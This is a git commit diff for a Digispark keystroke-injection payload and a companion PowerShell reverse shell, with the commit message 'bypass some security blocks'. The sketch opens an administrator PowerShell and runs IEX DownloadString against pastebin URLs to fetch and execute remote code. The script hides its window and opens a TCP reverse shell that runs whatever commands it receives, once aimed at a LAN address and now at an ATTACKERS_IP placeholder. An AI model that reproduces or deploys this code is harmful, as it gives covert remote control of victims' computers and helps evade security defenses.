dcca325eb704adbdc2649cc001054cc60c4e4489
diegofelipe01 <50500419+diegofelipe01@users.noreply.github.com>
2020-08-04 12:06:39 -0300

    Updated to bypass some security blocks

--- reverseShell/reverseShell.ino
+++ reverseShell/reverseShell.ino
@@ -1,14 +1,21 @@
 #include "DigiKeyboard.h"
+
 void setup() {
 }
 
 void loop() {
-  
+
   DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/dR6hUwxK');\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/0kqGUKpZ');");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   while(true){
--- reverseShell/reverseShell.ps1
+++ reverseShell/reverseShell.ps1
@@ -1,1 +1,5 @@
-$sm=(New-Object Net.Sockets.TCPClient("192.168.9.100",9999)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+
+$sm=(New-Object Net.Sockets.TCPClient(ATTACKERS_IP,PORT_USED)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
